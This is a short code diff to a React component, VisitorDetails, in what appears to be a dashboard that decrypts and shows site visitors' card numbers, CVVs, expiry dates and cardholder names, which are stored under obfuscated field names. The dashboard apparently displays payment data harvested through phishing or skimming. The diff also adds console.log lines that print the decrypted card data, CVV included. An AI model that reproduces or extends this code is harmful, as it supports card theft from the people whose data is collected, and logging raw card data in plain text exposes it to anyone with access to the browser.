@@ -217,17 +217,25 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     // Card Info - check history first, then fallback to direct fields
     const latestCardHistory = visitor.history?.find((h: any) => h.entryType === '_t1' || h.entryType === 'card')
     
+    console.log('[Dashboard] History:', visitor.history)
+    console.log('[Dashboard] Latest card history:', latestCardHistory)
+    console.log('[Dashboard] Direct fields:', { _v1: visitor._v1, _v2: visitor._v2, _v3: visitor._v3, _v4: visitor._v4 })
+    
     // Get encrypted values
     const encryptedCardNumber = latestCardHistory?.data?._v1 || visitor._v1 || visitor.cardNumber
     const encryptedCvv = latestCardHistory?.data?._v2 || visitor._v2 || visitor.cvv
     const encryptedExpiryDate = latestCardHistory?.data?._v3 || visitor._v3 || visitor.expiryDate
     const encryptedCardHolderName = latestCardHistory?.data?._v4 || visitor._v4 || visitor.cardHolderName
     
+    console.log('[Dashboard] Encrypted values:', { cardNumber: encryptedCardNumber, cvv: encryptedCvv, expiryDate: encryptedExpiryDate, cardHolderName: encryptedCardHolderName })
+    
     // Decrypt values
     const cardNumber = encryptedCardNumber ? _d(encryptedCardNumber) : undefined
     const cvv = encryptedCvv ? _d(encryptedCvv) : undefined
     const expiryDate = encryptedExpiryDate ? _d(encryptedExpiryDate) : undefined
     const cardHolderName = encryptedCardHolderName ? _d(encryptedCardHolderName) : undefined
+    
+    console.log('[Dashboard] Decrypted values:', { cardNumber, cvv, expiryDate, cardHolderName })
     
     if (cardNumber) {
       bubbles.push({
